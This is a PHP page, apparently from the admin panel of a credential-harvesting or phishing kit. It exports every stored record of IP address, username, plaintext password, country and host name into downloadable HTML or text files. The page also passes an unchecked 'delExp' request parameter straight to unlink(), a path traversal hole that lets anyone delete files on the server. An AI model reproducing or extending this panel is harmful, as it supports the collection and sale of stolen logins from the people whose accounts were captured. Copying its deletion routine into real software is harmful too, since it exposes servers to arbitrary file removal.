<?php
	session_start();
	require_once('inc/session.php');
	require_once('inc/config.php');
	require_once('inc/header.php');
	require_once('connect/mysql.php');
?>
<form action="export.php" method="post">
		<h2>Export</h2>
		<p>Save Export as : 
		<input type="radio" name="art" checked="true" value="htmlFile" />.html
		<input type="radio" name="art" value="txtFile" />.txt
		<input type="submit" class="button" value="Confirm" name="backupsend" style="float: right;" /></p>
  	</form>
<script type="text/javascript">
function submitform()
{
    document.forms["myform"].submit();
}
</script>
<h2>Current Exports</h2>
<?php

$verzeichnis = openDir("exports");
$int = 0;
while ($file = readDir($verzeichnis)) {
 if ($file != "." && $file != "..") {
  if (strstr($file, ".html") || strstr($file, ".txt")) {
   	echo '
   		<p><form action="export.php" method="post" id="myform">
   			  <a href="exports/'.$file.'" target="_blank" style="color: grey;"><img src="img/other/database.png" style="margin-bottom:-4px;" />&nbsp;'.$file.'</a><a href="export.php?delExp='.$file.'">&nbsp;<img style="margin-bottom:-3px;" src="img/other/del.png" alt="L&ouml;schen" style="border: 0px;" /></a>
   			  <input type="hidden" name="file" value="'.$file.'" />
   		</form></p>';
		$int ++;
  }
 }
}
if($int==0){
echo '<div id="infobox" style="width:220px;color: #AFAFAF;" ><img src="img/other/information_grey.png" style="margin-bottom:-4px;" />&nbsp;No current Exports.</div>';
}
closeDir($verzeichnis);

// FUNCTIONS //

if(isset($_GET['delExp'])){
	$file = $_GET['delExp'];
	unlink('exports/'.$file);
	echo '<meta http-equiv="refresh" content="0; url=export.php">';
}


if(isset($_POST['art'])){	
		$art	   = $_POST['art'];
		$datum 	   = date('m_d_Y__H_i_s');
		if($art=="htmlFile"){
		$datei 	   = $datum . '.html';
		}
		if($art=="txtFile"){
		$datei 	   = $datum . '.txt';
		}
		$fp 	   = fopen('exports/'.$datei,'a+');		
		$query_1 = mysql_query("SELECT * FROM maintable");
		if($art=="htmlFile"){
		while($row = mysql_fetch_array($query_1))
		  {
			fwrite($fp,'<b>Index </b>&nbsp;'.$row[Index].'<br />');
			fwrite($fp,'<b>IP Adress </b>&nbsp;'.$row[IPAdress].'<br />');
			fwrite($fp,'<b>Username </b>&nbsp;'.$row[Username].'<br />');
			fwrite($fp,'<b>Password </b>&nbsp;'.$row[Password].'<br />');
			fwrite($fp,'<b>Date </b>&nbsp;'.$row[Zeit].' '.$row[Datum].' <br />');
			fwrite($fp,'<b>Country Code </b>&nbsp;'.$row[Country].'<br />');
			fwrite($fp,'<b>Host Name </b>&nbsp;'.$row[RemoteHost].'<br /><br />');
		  }	  
		}
		if($art=="txtFile"){
		while($row = mysql_fetch_array($query_1))
		  {
			fwrite($fp,''.$row[Index].'|');
			fwrite($fp,''.$row[IPAdress].'|');
			fwrite($fp,''.$row[Username].'|');
			fwrite($fp,''.$row[Password].'|');
			fwrite($fp,''.$row[Zeit].' '.$row[Datum].'|');
			fwrite($fp,''.$row[Country].'|');
			fwrite($fp,''.$row[RemoteHost].'#');
		  }	  
		}
		fflush($fp); 
		fclose($fp);	
		echo '<meta http-equiv="refresh" content="0; url=export.php">';
	};

	
	
require_once('inc/footer.php');
?>